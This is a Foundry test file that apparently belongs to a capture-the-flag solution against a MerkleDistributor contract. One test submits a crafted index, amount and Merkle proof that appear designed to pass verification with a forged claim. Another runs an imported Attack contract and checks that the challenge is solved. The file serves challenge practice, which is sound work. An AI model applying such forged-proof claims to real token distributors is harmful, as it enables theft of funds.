// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../contracts/Setup.sol";
import "./Attack.sol";

contract AttackTest is Test {
    Setup sc = new Setup();
    MerkleDistributor merkleDistributor;

    function setUp() public {
        merkleDistributor = sc.merkleDistributor();
    }

    function testProof() public {
        uint256 index = 95977926008167990775258181520762344592149243674153847852637091833889008632898;
        address account = 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A;
        uint96 amount = 72033437049132565012603;

        bytes32[] memory proof = new bytes32[](5);
        proof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d;
        proof[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde;
        proof[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813;
        proof[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c;
        proof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5;

        merkleDistributor.claim(index, account, amount, proof);
    }

    function testAttack() public {
        Attack attack = new Attack(merkleDistributor);
        attack.attack();

        assertTrue(sc.isSolved());
    }
}
